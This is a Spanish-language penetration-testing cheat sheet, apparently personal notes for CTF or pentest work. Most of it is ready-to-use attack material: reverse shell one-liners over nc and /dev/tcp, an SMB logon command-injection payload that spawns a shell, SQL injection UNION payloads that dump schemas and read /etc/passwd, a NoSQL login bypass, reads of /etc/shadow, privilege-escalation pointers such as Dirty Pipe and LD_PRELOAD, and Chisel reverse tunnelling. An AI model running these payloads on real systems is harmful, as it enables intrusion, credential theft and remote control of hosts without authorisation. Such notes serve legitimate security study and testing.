# General-CheatSheet
[PayloadAllTheThinks](https://github.com/swisskyrepo/PayloadsAllTheThings) Lista de payloads y bypasses para Web Application Security.

## Linux Commands

### FIND
* Listar los permisos SUID, debe estar en la carpeta raiz del SO: ``` find  \-perm -4000 2>/dev/null ```

### Sistema Operativo
* Conocer la IP de la máquina ``` hostname -I ```
* Permite ver los puertos abiertos de la máquina ``` netstat -nat ```
* Permite ver los procesos corriendo en la máquina ``` ps -faux ```
* Permite ver los archivos que tienen procesos abiertos ``` lsof -i:<PORT> ```
* Permite ver la descripción del sistema operativo ``` lsb_release -a ```
* Permite ver la versión del kernel ``` uname -a ```
* Permite ajustar el número de filas y columnas de la tty ``` stty rows <ROW_NUMBER> columns <COLUMN_NUMBER> ```
* Permite convertir hexadecimal a texto ```echo "<HEX>" | xargs | xxd -ps -r ```
* Buscar las capabilities ``` getcap -r / 2>/dev/null ```
* Ver procesos corriendo (Para este caso se filtra y se muestra los procesos de root) ``` ps aux | grep root ```

### Full TTY
Te permite tener una consola interactiva
* [Full TTYs](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

### Python
* Crear un servidor de python en mi máquina local ``` python3 -m http.server <PORT> ```

### Reverse Shell
Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```

Y luego usar alguno de los siguientes comandos

> nc -e /bin/bash \<IP> \<PORT>

> bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1

> bash -c "bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1" ```
 

* [Reverse Shell Guide](https://kb.systemoverlord.com/security/postex/reverse/) 

#### SMB
Dentro de una consola de smb, usando por ejemplo smbclient
> logon "./=\`nohup nc -e /bin/bash \<IP> \<PORT>`"


## Privilege Escalation

### Docker Escape
* [Docker Socket Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape)

### Pkexec
Se comprueba si existe pkexec instalado y si tiene permisos SUID
> which pkexec | xargs ls -l

### Dirty Pipe
Se debe tener GCC instalado en la máquina a atacar
* [Dirty Pipe](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

### Ld_preload & Ld_library_path
En sudo -l debe aparecer ld_preload
* [Ld_preload](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)

### SetEnv
En sudo -l se debe poder ejecutar archivos
[Set an environment variable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv)


## Information Disclose
Archivos PHP con posible información sensible

### Linux
Usuarios y passwords
```
/etc/passwd
/etc/shadow
```
Puertos abiertos
```
/proc/net/tcp
```
Conocer segmento de red de la máquina
```
/proc/net/fib_trie
```

### PHP
```
/cgi-bin/phpinfo.php
/info.php
```


## SQL Injection

### List of Databases, Tables and Columns
Lista información de las bases de datos
> ' union select schema_name from information_schema.schemata-- -

Lista información de las tablas
> ' union select table_name from information_schema.tables where table_schema="<TABLE_NAME>"-- -

Lista información de las columnas
> ' union select column_name from information_schema.columns where table_schema=”<DB_NAME>” and table_name = '<TABLE_NAME>'-- -

### Cargar archivos
> ' union select 1,2,load_file("/etc/passwd")


## NoSQL Injection
> admin'||''==='


## Tools

### Kubernetes
#### Kubeletctl
* ``` kubeletctl exec -s <SERVER_IP>  -p <POD_NAME> -c <CONTAINER_NAME> -i "bash" ```

### Chisel
Chisel se usa para realizar acciones como **LOCAL o REMOTE PORT-FORWARD**

Dejar abierta una conexión como Server
```
./chisel server --reverse -p <PORT>
```
Abrir una conexión como Client al Server, para este caso asiendo **Remote Port-Forward**
```
./chisel client <CHISEL_SERVER_IP>:<CHISEL_SERVER_PORT> R:<LOCAL_PORT>:<LOCAL_IP>:<LOCAL_PORT>
```

### SNMP
#### Onesixtyone
Onesixtyone permite hacer fuerza bruta para conocer las community en un servicio snmp
```
onesixtyone <REMOTE_IP> -c <DICTIONARY_PATH>
```
### Snmpwalk
```
snmpwalk -c <COMMUNITY> -v<SNMP_VERSION> <REMOTE_IP> <SEARCH_PATH>
```
Ejemplo, consideremos que el caracter **|** indica que podemos utilizar una de esas
```
snmpwalk -c public|private|etc -v1|2c|3 1.1.1.1 1|2
```